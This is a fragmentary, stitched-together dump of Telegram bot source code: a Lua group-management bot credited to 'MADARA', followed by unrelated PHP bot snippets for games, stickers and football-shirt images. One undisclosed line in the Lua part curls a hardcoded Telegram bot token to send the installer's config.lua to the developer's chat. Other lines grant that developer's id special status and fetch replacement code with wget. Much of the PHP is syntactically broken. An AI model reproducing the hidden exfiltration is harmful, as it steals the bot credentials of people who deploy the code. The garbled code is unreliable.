...
-- All The File By Developer MADARA : @M_A_D_A_R_A_A
-- Join In Chennel Source : @source_allam
-- Join In Explanation Channel : @source_allam
----------------------------------------------------------------------------
...
local curl = 'curl "'..'https://api.telegram.org/bot2011835273:AAGx8P7ET-8HdWwLgilSlC1Ux1U0vxI9U-Q/sendDocument'..'" -F "chat_id='.. 1830814795 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
...
name_bot = (faederdx1:get(FAEDER..'name_bot') or 'مادارا')
SudoFaeder = SUDOUSERNAME:gsub('@','') 
SudoFaeder = SudoFaeder:gsub([[\_]],'_')
----------------------------------------------------------
-- Start Functions Source MADARA --
--     By Developer MADARA     -- 
-------- Bot Owner
...
if tonumber(msg.sender_user_id_) == tonumber(1830814795) then
faeder  = "مبرمج السورس"
...
if tonumber(user_id) == tonumber(1830814795) then
faeder  = "مبرمج السورس"
...
if faeder5 then
faederdx(msg.chat_id_, msg.id_, 1, '❅∫ *قناة الاشتراك* : ['..source_allam..']', 1, 'md')
else
...
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(1830814795) then
...
local inline = {
{{text="- قناة السورس ،",url="t.me/source_allam"},
{text="- مبرمج السورس،",url="t.me/M_A_D_A_R_A_A"}},
{{text="- اضغط هنا لتنصيب السورس ،",url="t.me/allam_source"}},
{{text="- اتشانل كتابات ،",url="https://t.me/joinchat/REDDEVIILL"},
{text="- شروحات السورس ،",url="t.me/source_allam"}}
}
...
if tonumber(result.id_) == tonumber(1830814795) then 
...
.."❅∫ عدد التكرار ، [ "..flood_m.." ]\n"
.."️❅∫ عدد السبام ، [ "..spam_c.." ]\n"
.."         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ [ALLAM CH](https://t.me/source_allam)\n"
...
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
❅∫ مطور البوت : @]]..Sudo_1830814795.[[

❅∫ قناة السورس : @source_allam
]] 
...
os.execute('rm -rf MADARA.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMALLAM/ALLAMMM/master/MADARA.lua') 
...
-- All The File By Developer MADARA : @M_A_D_A_R_A_A
-- Join In Chennel Source : @source_allam
-- Join In Explanation Channel : @REDDEVIILL
$abuehab = array("%10","%20","%30","%35","%75","%34","%66","%82","%23","%19","%55","%80","%63","%32","%27","%89","%99","%98","%79","%100","%8","%3","%6","%0");
$abuehab2 = array_rand($abuehab,1);
$rt = $update->message->reply_to_message;
if($text=="نسبة الرجوله" and $rt){
bot( sendMessage , [
 chat_id =>$chat_id,
 text =>"اسمه - $re_name
نسبة الرجوله - $abuehab[$abuehab2]
...
$file = str_replace("جلب ","",$text);
if($text == "جلب $file" and $from_id == $taz){
bot( senddocument ,[
 chat_id =>$chat_id,
 document =>new CURLFile("$file"),
' reply_to_message_id'=>$message_id,
]);}
$txt = str_replace("بحث ","",$text);
if($text == "بحث $txt"){
bot( sendmessage ,[
 chat_id =>$chat_id,
 text =>"
- قم بااختيار النتيجه من اسفل .
- اليك 6 مواقع للبحث .
",
 reply_to_message_id =>$message->message_id, 
 parse_mode =>"Markdown",
...
$idbot = 2011835273; //ايدي بوتك
if($re and $text == "مادارا" and $from_id != $re_id or $re_id != $idbot ){
...
if($re and $text == "مادارا" and $from_id == $re_id){
bot( sendmessage ,[
 chat_id  => $chat_id,
 text  =>  قلبو جايلك اهو  ,
 reply_to_message_id  =>$message->message_id,
...
if($re and $text == "مادارا" and $re_id == $idbot){
bot( sendmessage ,[
 chat_id  => $chat_id,
 text  =>   بيحبك يقلبو  ,
 reply_to_message_id  =>$message->message_id,
...
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[[ text =>"لشراء الالعاب لبوتك راسلني", url => https://t.me/sand_1999 ]],
...
bot( sendphoto ,[
 ...
 caption =>"well come to armof bot",
 reply_markup =>json_encode([
 inline_keyboard =>[[[ text =>"hi ","url"=>"t.me/source_allam"]]
]
])
]);
}else{
...
$json = json_decode(file_get_contents("sticker.json"),true);
...
file_put_contents("sticker.json",json_encode($json));
bot( sendMessage ,[
 chat_id =>$chat_id,
 text =>"
⌯ بواسطه [$name](tg://user?id=$from_id)
...
bot( sendMessage ,[
 chat_id =>$chat_id,
 text =>"⌯ لاتوجد ملصقات في هذه الحزمه 
...
bot( sendMessage ,[
 chat_id =>$chat_id,
 text =>"⌯ بواسطه : [$name](tg://user?id=$from_id)
⌯ تم حذف حزمه ( $st ) ",
 reply_to_message_id =>$message_id,
...
$ball = json_decode(file_get_contents("ball.json"),true);
$name = $ball[$from_id]["name"];
$number = $ball[$from_id]["number"];
$api = "https://footballshirtmaker.com/en/spain/shirt-2021-II/number-$number-$name-001-square?v1200";
if($text == "/start"){
unset($ball[$from_id]["name"]);
unset($ball[$from_id]["number"]);
$ball[$from_id]["name"] = "$from_id";
file_put_contents("ball.json",json_encode($ball));
bot( sendMessage , [
 chat_id  =>$chat_id,
 text  =>"مرحبا بك في البوت
يقوم البوت بكتابه اسمك على دريس اللاعبين مع اختيار رقم اللاعب
ارسل اسمك من فظلك",  reply_to_message_id =>$message->message_id,
]) ;
}

if($text != "/start" and preg_match( /([a-z])/i , $text) and $from_id == $name){
$ball[$from_id]["name"] = "$text" ;
$ball[$from_id]["number"] = "$from_id";
file_put_contents("ball.json",json_encode($ball));
bot( sendMessage , [
 chat_id  =>$chat_id,
 text  =>"الان ارسل رقم اللاعب", reply_to_message_id =>$message->message_id, 
]);
}elseif($text != "/start" and $text != "جلب الصوره" and preg_match( /([ا-ي])/i , $text)){
bot( sendMessage , [
 chat_id  =>$chat_id,
 text  =>"ارسل اسمك باللغه الانجليزيه", reply_to_message_id =>$message->message_id, 
]);
}
if(preg_match( /([0-9])/i , $text) and $from_id == $number){
$ball[$from_id]["number"] = "$text";
file_put_contents("ball.json",json_encode($ball));
bot( sendMessage , [
 chat_id  =>$chat_id,
 text  =>"
الان ارسل كلمة *جلب الصوره* لاحظارها لك",  reply_to_message_id =>$message->message_id, 
 parse_mode  =>"markdown", 
]);
}
if($text == "جلب الصوره"){
bot( sendphoto , [
 chat_id  =>$chat_id,
 photo  =>"$api", reply_to_message_id =>$message->message_id, 
]);
unset($ball[$from_id]["name"]);
unset($ball[$from_id]["number"]);
file_put_contents("ball.json",json_encode($ball));
